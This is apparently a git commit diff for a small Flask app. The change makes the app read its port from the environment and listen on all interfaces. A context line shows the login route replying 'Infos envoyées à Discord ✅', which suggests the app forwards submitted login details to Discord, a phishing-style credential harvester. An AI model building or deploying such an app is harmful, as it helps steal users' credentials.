29d8b3e91971bba2926077e35c5bccbf8a823c81
Sem Fokker <sem.fokker.dirk@gmail.com>
2025-08-07 23:19:32 +0100

    initial commit

--- app.py
+++ app.py
@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request
 import requests
+import os
 
 app = Flask(__name__)
 
@@ -23,4 +24,5 @@ def login():
     return "Infos envoyées à Discord ✅"
 
 if __name__ == '__main__':
-    app.run(port=5000, debug=True)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
